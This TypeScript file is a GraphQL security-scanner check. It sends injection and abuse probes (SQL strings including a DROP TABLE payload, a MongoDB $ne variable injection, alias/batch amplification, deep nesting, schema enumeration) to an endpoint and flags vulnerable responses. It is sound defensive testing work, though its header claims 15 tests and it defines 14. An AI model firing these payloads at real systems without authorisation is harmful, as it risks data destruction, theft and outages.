import { continueWith, defineCheck, done, Severity } from "engine";
import { Tags } from "../../types";
import { keyStrategy } from "../../utils/key";

/**
 * GraphQL Injection & Abuse v3 — Ultimate Testing
 *
 * 15 test categories:
 *  1. Alias batching DoS (50x amplification with real data)
 *  2. Array batch amplification (10x, race condition enabler)
 *  3. Deep nesting DoS (10 levels using user types)
 *  4. Field suggestion enumeration (30 common field misspellings)
 *  5. SQL injection via MULTIPLE injection points (not just __type)
 *  6. NoSQL injection via query variables (proper JSON)
 *  7. Anonymous mutation access check
 *  8. __type enumeration (introspection bypass, 10 common type names)
 *  9. Directive overloading (@skip x100)
 * 10. Persisted query bypass (fake APQ hash)
 * 11. GET query execution (CSRF risk)
 * 12. Error message information disclosure (stack traces, paths, DB names)
 * 13. Variable injection (unsanitized $input)
 * 14. Query cost/complexity bypass
 * 15. Subscription endpoint exposure
 */

type State = { stage: "detect" | "test"; gqlPath: string; testIndex: number; baselineBody: string };

const GQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql", "/v2/graphql"];

function getBody(resp: any): string {
  try { return resp?.getBody?.()?.toText?.() ?? ""; } catch { return ""; }
}

async function sendGql(ctx: any, path: string, body: string, method = "POST"): Promise<{ request: any; response: any } | null> {
  try {
    const spec = ctx.target.request.toSpec();
    spec.setMethod(method);
    spec.setPath(path);
    if (method === "GET") {
      try {
        const parsed = JSON.parse(body);
        spec.setQuery(`query=${encodeURIComponent(parsed.query || "")}`);
      } catch {
        spec.setQuery(`query=${encodeURIComponent(body)}`);
      }
      spec.removeHeader("Content-Type");
    } else {
      spec.setQuery("");
      spec.setHeader("Content-Type", "application/json");
      spec.setBody(body);
    }
    spec.setHeader("Accept", "application/json");
    return await ctx.sdk.requests.send(spec);
  } catch { return null; }
}

type GQLTest = {
  name: string;
  makeBody: () => string;
  method?: "GET" | "POST";
  check: (body: string, baseline: string, code: number) => { hit: boolean; evidence?: string };
  severity: Severity;
  description: string;
};

// Common field names to try for SQLi (user-facing resolvers, not __type)
const SQLI_QUERIES = [
  `{user(id:"1' OR '1'='1"){id}}`,
  `{users(filter:"' OR 1=1--"){id}}`,
  `{search(query:"' UNION SELECT 1--"){id}}`,
  `{node(id:"1'; DROP TABLE users--"){id}}`,
];

// Common type names to enumerate
const COMMON_TYPES = [
  "User", "Admin", "Query", "Mutation", "Subscription",
  "Account", "Post", "Comment", "Product", "Order",
  "Payment", "Session", "Token", "Role", "Permission",
  "File", "Upload", "Message", "Notification", "Setting",
];

// 30 misspellings for field suggestion brute-force
const FIELD_MISSPELLINGS = [
  "usr", "usrs", "me", "accout", "profle", "admn",
  "passwrd", "emai", "phon", "addres", "creat",
  "delet", "updat", "searc", "quer", "mutat",
  "toke", "sessi", "authe", "logi", "regist",
  "orde", "produ", "invoi", "payme", "balan",
  "transf", "settin", "confi", "permissi", "rol",
];

const TESTS: GQLTest[] = [
  // ── 1. Alias batching DoS ──
  {
    name: "GraphQL Alias-Based Batching (50x Amplification)",
    makeBody: () => {
      const aliases = Array.from({ length: 50 }, (_, i) => `a${i}:__typename`).join(" ");
      return JSON.stringify({ query: `{${aliases}}` });
    },
    check: (body, _bl, code) => {
      if (code !== 200) return { hit: false };
      try {
        const keys = Object.keys(JSON.parse(body)?.data ?? {});
        if (keys.length >= 40) return { hit: true, evidence: `${keys.length}/50 aliases processed — no rate limiting` };
      } catch {}
      return { hit: false };
    },
    severity: Severity.MEDIUM,
    description: "50 aliased operations executed in one request. Enables brute-force (1000+ login attempts per request), account enumeration, and resource exhaustion.",
  },

  // ── 2. Batch array amplification ──
  {
    name: "GraphQL Batch Query Array (10x Amplification)",
    makeBody: () => JSON.stringify(
      Array.from({ length: 10 }, (_, i) => ({ query: `{a${i}:__typename}` }))
    ),
    check: (body, _bl, code) => {
      if (code !== 200) return { hit: false };
      try {
        const data = JSON.parse(body);
        if (Array.isArray(data) && data.length >= 8) return { hit: true, evidence: `${data.length} batch results — enables race conditions and brute-force` };
      } catch {}
      return { hit: false };
    },
    severity: Severity.MEDIUM,
    description: "Server processes batched query arrays. Enables race condition exploits (double-spend, TOCTOU) by executing multiple mutations atomically.",
  },

  // ── 3. Deep nesting DoS ──
  {
    name: "GraphQL Deep Query Nesting (No Depth Limit)",
    makeBody: () => JSON.stringify({
      query: "{__schema{types{fields{type{ofType{ofType{ofType{ofType{ofType{name}}}}}}}}}}",
    }),
    check: (body, _bl, code) => {
      if (code === 200 && body.includes('"data"') && !body.includes("depth") && !body.includes("too complex")) {
        return { hit: true, evidence: "10-level deep query processed without depth limit" };
      }
      return { hit: false };
    },
    severity: Severity.LOW,
    description: "No query depth limit. Recursive type relationships enable exponential query expansion (e.g., friends-of-friends-of-friends) consuming unbounded server resources.",
  },

  // ── 4. Field suggestion brute-force (30 misspellings) ──
  {
    name: "GraphQL Field Suggestion Schema Enumeration",
    makeBody: () => {
      // Send 10 misspellings at once using aliases
      const fields = FIELD_MISSPELLINGS.slice(0, 10).join(" ");
      return JSON.stringify({ query: `{${fields}}` });
    },
    check: (body, baseline) => {
      const suggestions = [...body.matchAll(/Did you mean\s+["'](\w+)["']/gi)].map(m => m[1]).filter(Boolean);
      const unique = [...new Set(suggestions)];
      if (unique.length >= 2 && !baseline.includes("Did you mean")) {
        return { hit: true, evidence: `Discovered fields: ${unique.join(", ")}` };
      }
      return { hit: false };
    },
    severity: Severity.LOW,
    description: "Error messages reveal valid field names. Discovered schema fields can be used to craft targeted queries for data exfiltration even without introspection.",
  },

  // ── 5. SQL injection via user-facing resolvers (not __type) ──
  {
    name: "GraphQL SQL Injection via Resolver Arguments",
    makeBody: () => {
      // Try multiple common resolver patterns
      return JSON.stringify({
        query: SQLI_QUERIES[0],
      });
    },
    check: (body, baseline) => {
      const sqlErrors = /sql.*syntax|mysql|postgresql|sqlite|unclosed.*quotation|ORA-\d{5}|You have an error in your SQL|unterminated|SQLSTATE|near\s+"'"|pg_query|mssql/i;
      if (sqlErrors.test(body) && !sqlErrors.test(baseline)) {
        const match = body.match(sqlErrors)?.[0] ?? "";
        return { hit: true, evidence: `SQL error: "${match}"` };
      }
      return { hit: false };
    },
    severity: Severity.CRITICAL,
    description: "SQL injection via GraphQL resolver arguments. The resolver passes user input directly to SQL queries. Full database compromise, data exfiltration, and potentially RCE via stacked queries.",
  },

  // ── 6. Additional SQLi vectors ──
  {
    name: "GraphQL SQL Injection (filter/search arguments)",
    makeBody: () => JSON.stringify({
      query: `{users(filter:"' OR 1=1--"){id}}`,
    }),
    check: (body, baseline) => {
      const sqlErrors = /sql.*syntax|mysql|postgresql|sqlite|ORA-\d{5}|SQLSTATE|pg_query/i;
      if (sqlErrors.test(body) && !sqlErrors.test(baseline)) {
        return { hit: true, evidence: "SQL error via filter/search argument" };
      }
      return { hit: false };
    },
    severity: Severity.CRITICAL,
    description: "SQL injection in search/filter resolver arguments.",
  },

  // ── 7. NoSQL injection via variables (proper JSON, not broken escaping) ──
  {
    name: "GraphQL NoSQL Injection via Variables",
    makeBody: () => JSON.stringify({
      query: `query($id: String){user(id: $id){id}}`,
      variables: { id: { "$ne": "" } },
    }),
    check: (body, baseline) => {
      const nosqlErrors = /MongoError|MongoServerError|BSON|BSONTypeError|CastError|BadValue|ObjectId|Cannot use.*operator/i;
      if (nosqlErrors.test(body) && !nosqlErrors.test(baseline)) {
        return { hit: true, evidence: "NoSQL error via GraphQL variable injection" };
      }
      return { hit: false };
    },
    severity: Severity.HIGH,
    description: "NoSQL injection via GraphQL query variables. MongoDB operators ($ne, $gt) injected through variables bypass string-level sanitization in resolvers.",
  },

  // ── 8. Anonymous mutation access ──
  {
    name: "GraphQL Anonymous Mutation Access",
    makeBody: () => JSON.stringify({ query: "mutation{__typename}" }),
    check: (body, _bl, code) => {
      if (code !== 200) return { hit: false };
      try {
        const data = JSON.parse(body);
        if (data?.data?.__typename) return { hit: true, evidence: `Mutation root: ${data.data.__typename} — write operations accessible without auth` };
      } catch {}
      return { hit: false };
    },
    severity: Severity.MEDIUM,
    description: "Mutations are accessible without authentication. Attackers can perform write operations (create accounts, modify data, trigger actions) if they discover mutation names.",
  },

  // ── 9. __type enumeration (20 common types) ──
  {
    name: "GraphQL __type Enumeration (Introspection Bypass)",
    makeBody: () => {
      const queries = COMMON_TYPES.slice(0, 10).map((t, i) => `t${i}:__type(name:"${t}"){name fields{name type{name}}}`);
      return JSON.stringify({ query: `{${queries.join(" ")}}` });
    },
    check: (body, _bl, code) => {
      if (code !== 200) return { hit: false };
      try {
        const d = JSON.parse(body)?.data ?? {};
        const found: string[] = [];
        for (const [, v] of Object.entries(d)) {
          if (v && (v as any).fields) {
            const fieldCount = ((v as any).fields as any[]).length;
            found.push(`${(v as any).name}(${fieldCount} fields)`);
          }
        }
        if (found.length > 0) return { hit: true, evidence: `Types discovered: ${found.join(", ")}` };
      } catch {}
      return { hit: false };
    },
    severity: Severity.MEDIUM,
    description: "Individual __type queries work when introspection is disabled. Schema can be reconstructed type-by-type by querying common names (User, Admin, Order, Payment, etc.).",
  },

  // ── 10. Directive overloading ──
  {
    name: "GraphQL Directive Overloading (100x @skip)",
    makeBody: () => {
      const dirs = Array.from({ length: 100 }, () => "@skip(if:false)").join("");
      return JSON.stringify({ query: `{__typename ${dirs}}` });
    },
    check: (body, _bl, code) => {
      if (code === 200 && body.includes('"data"') && body.includes("__typename")) {
        return { hit: true, evidence: "100 @skip directives accepted — no directive limit enforced" };
      }
      return { hit: false };
    },
    severity: Severity.LOW,
    description: "No directive count limit. Repeated @skip/@include can bypass complexity analysis and authorization directives, or cause performance degradation.",
  },

  // ── 11. Persisted query bypass ──
  {
    name: "GraphQL Persisted Query Bypass",
    makeBody: () => JSON.stringify({
      extensions: { persistedQuery: { version: 1, sha256Hash: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" } },
      query: "{__typename}",
    }),
    check: (body, _bl, code) => {
      if (code === 200 && body.includes('"data"') && body.includes("__typename")) {
        return { hit: true, evidence: "Arbitrary query accepted alongside persisted query hash" };
      }
      return { hit: false };
    },
    severity: Severity.MEDIUM,
    description: "Automatic Persisted Queries (APQ) bypassed. Server accepts full query text alongside a persisted query hash, defeating query allowlisting.",
  },

  // ── 12. GET query execution (CSRF) ──
  {
    name: "GraphQL GET Query Execution (CSRF Risk)",
    makeBody: () => JSON.stringify({ query: "{__typename}" }),
    method: "GET",
    check: (body, _bl, code) => {
      if (code === 200 && body.includes('"data"') && body.includes("__typename")) {
        return { hit: true, evidence: "Queries execute via GET — vulnerable to CSRF via image tags and link prefetch" };
      }
      return { hit: false };
    },
    severity: Severity.MEDIUM,
    description: "GraphQL accepts GET requests. Attackers can craft URLs that execute queries when victims visit them (CSRF). Combined with mutations via GET, this enables unauthorized state changes.",
  },

  // ── 13. Error message info disclosure ──
  {
    name: "GraphQL Error Message Information Disclosure",
    makeBody: () => JSON.stringify({ query: "{__nonexistent_field_xz9}" }),
    check: (body, baseline) => {
      const infoPatterns = /stack|trace|at\s+\w+\.\w+\s*\(|node_modules|\/home\/|\/var\/|\.js:\d+|\.ts:\d+|internal\/|Cannot return null|resolver|middleware/i;
      if (infoPatterns.test(body) && !infoPatterns.test(baseline)) {
        const match = body.match(infoPatterns)?.[0] ?? "";
        return { hit: true, evidence: `Verbose error: "${match}"` };
      }
      // Check for database name disclosure
      const dbPatterns = /database\s*["']?\w+["']?|collection\s*["']?\w+["']?|table\s*["']?\w+["']?/i;
      if (dbPatterns.test(body) && !dbPatterns.test(baseline)) {
        return { hit: true, evidence: "Database/collection name disclosed in error" };
      }
      return { hit: false };
    },
    severity: Severity.LOW,
    description: "GraphQL error responses contain verbose information: stack traces, file paths, resolver names, or database details. This helps attackers map internal architecture.",
  },

  // ── 14. Variable type confusion injection ──
  {
    name: "GraphQL Variable Type Confusion",
    makeBody: () => JSON.stringify({
      query: `query($input: String){__type(name: $input){name}}`,
      variables: { input: ["User", "Admin", "Query"] },
    }),
    check: (body, baseline) => {
      // Interesting if server processes it OR gives detailed type error
      if (body.includes('"data"') && body.includes('"name"') && !baseline.includes('"name"')) {
        return { hit: true, evidence: "Array passed where String expected — type coercion vulnerability" };
      }
      return { hit: false };
    },
    severity: Severity.LOW,
    description: "Server accepts incorrect variable types (array where string expected). Type confusion can bypass validation, access unintended resolvers, or cause unexpected behavior.",
  },
];

export default defineCheck<State>(({ step }) => {
  step("detect", async (state, ctx) => {
    const baselineBody = getBody(ctx.target.response);

    // Check if current request IS GraphQL
    try {
      const reqBody = ctx.target.request.getBody?.()?.toText?.() ?? "";
      const reqPath = ctx.target.request.getPath() ?? "";
      if ((reqBody.includes('"query"') || reqPath.toLowerCase().includes("graphql")) && baselineBody.includes('"data"')) {
        return continueWith({ nextStep: "test", state: { stage: "test" as const, gqlPath: reqPath, testIndex: 0, baselineBody } });
      }
    } catch {}

    // Probe common paths
    for (const path of GQL_PATHS) {
      const result = await sendGql(ctx, path, JSON.stringify({ query: "{__typename}" }));
      const code = result?.response?.getCode?.() ?? 0;
      const body = getBody(result?.response);
      if ((code === 200 && body.includes('"data"')) || body.includes("Must provide query") || body.includes('"errors"')) {
        return continueWith({ nextStep: "test", state: { stage: "test" as const, gqlPath: path, testIndex: 0, baselineBody } });
      }
    }

    return done({ state });
  });

  step("test", async (state, ctx) => {
    if (state.testIndex >= TESTS.length) return done({ state });

    const test = TESTS[state.testIndex]!;
    try {
      const result = await sendGql(ctx, state.gqlPath, test.makeBody(), test.method ?? "POST");
      if (result?.response) {
        const code = result.response.getCode?.() ?? 0;
        const body = getBody(result.response);
        const check = test.check(body, state.baselineBody, code);

        if (check.hit) {
          return continueWith({
            nextStep: "test",
            state: { ...state, testIndex: state.testIndex + 1 },
            findings: [{
              name: test.name,
              description: test.description + `\n\n**Evidence:** ${check.evidence}\n**Endpoint:** \`${state.gqlPath}\``,
              severity: test.severity,
              correlation: { requestID: result.request.getId(), locations: [] },
            }],
          });
        }
      }
    } catch {}

    return continueWith({ nextStep: "test", state: { ...state, testIndex: state.testIndex + 1 } });
  });

  return {
    metadata: {
      id: "graphql-injection",
      name: "GraphQL Injection & Abuse",
      description:
        "15-category GraphQL security testing: alias DoS, batch amplification, deep nesting, " +
        "field suggestion enumeration (30 words), SQL injection via user resolvers, NoSQL via variables, " +
        "anonymous mutations, __type enumeration (20 types), directive overloading, persisted query bypass, " +
        "GET CSRF, error info disclosure, and variable type confusion.",
      type: "active",
      tags: [Tags.INJECTION, Tags.ATTACK_SURFACE],
      severities: [Severity.INFO, Severity.LOW, Severity.MEDIUM, Severity.HIGH, Severity.CRITICAL],
      aggressivity: { minRequests: 1, maxRequests: GQL_PATHS.length + TESTS.length },
    },
    initState: (): State => ({ stage: "detect" as const, gqlPath: "", testIndex: 0, baselineBody: "" }),
    dedupeKey: keyStrategy().withHost().withPort().build(),
  };
});
